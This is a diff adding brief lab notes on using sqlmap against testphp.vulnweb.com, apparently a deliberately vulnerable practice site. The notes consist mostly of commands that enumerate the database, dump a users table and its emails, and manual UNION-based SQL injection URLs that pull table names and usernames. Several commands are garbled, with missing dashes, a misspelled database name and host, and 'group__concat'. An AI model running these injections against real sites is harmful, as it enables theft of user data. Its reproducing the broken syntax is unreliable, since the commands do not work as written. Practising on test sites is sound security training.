@@ -1,0 +1,31 @@
+SCRIPT STEPS:
+
+Exploring the functionalities of sqlmap Use inside Kali Linux installed in VMWare 
+
+1) Go to Test Site : testphp.vulnweb.com – acuart site
+
+2) Find the records in each table Perform the above tasks by a Using SQLMAP tool as
+   "sqlmap –u link –dbs"
+
+3) Fetch the details of all tables as " sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27 
+    D acurat --tables"
+
+4) Fetching the details of columns in users tables as "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27 
+    D acurat - T users --columns"
+
+5) Dump command as "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27 
+    D acurat - T users -C adesc,aname,artist_id,--dump"
+
+6) For eamil as "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27 
+    D acurat - T users -C email --dump"
+
+7) For Manual testing as "http://testphp.vulneb.com/artists.php?artist=-1 union select
+1,2,group__concat(table_name)from information_schema.tables where table_schema=database()--
+
+8) http://testphp.vulneb.com/artists.php?artist=1 union select
+1,2,group__concat(table_name)from information_schema.tables where table_schema=database()—
+
+9) http://testphp.vulneb.com/artists.php?artist=-1 union select 1,2,group__concat(uname)from users
+
+
+
